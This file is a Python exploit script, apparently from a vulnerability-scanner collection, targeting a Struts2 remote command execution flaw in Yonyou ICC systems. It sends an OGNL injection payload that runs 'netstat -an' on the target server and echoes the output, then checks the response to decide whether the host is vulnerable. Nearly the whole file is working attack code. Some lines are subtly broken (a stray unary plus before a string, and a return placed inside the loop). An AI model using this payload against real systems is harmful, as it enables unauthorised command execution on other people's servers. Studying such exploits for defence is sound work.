#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友ICC struts2远程命令执行
referer: http://www.wooyun.org/bugs/wooyun-2010-023876
author: Lucifer
description: 用友ICC系统存在struts2框架漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['用友ICC struts2远程命令执行','','']
        payload = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        for turl in [r"/web/icc/chat/chat?c=1&s=1",
                     r"/web/common/doUpload.action"]:
            vulnurl = url + turl + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                if r"Active Internet connections" in req.text:
                    result[2]=  '存在'
                    result[1]=vulnurl+"\t[Linux]"
                    return result
                if r"Active Connections" in req.text or r"活动连接" in req.text:
                    result[2]=  '存在'
                    result[1]=+vulnurl+"\t[Windows]"
                    return result
                if r"LISTEN" in req.text:
                    result[2] = '可能存在'
                    result[1]=+vulnurl
                    return result
                else:
                    result[2]=  '不存在'

            except:
                result[2]='不存在'
            return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
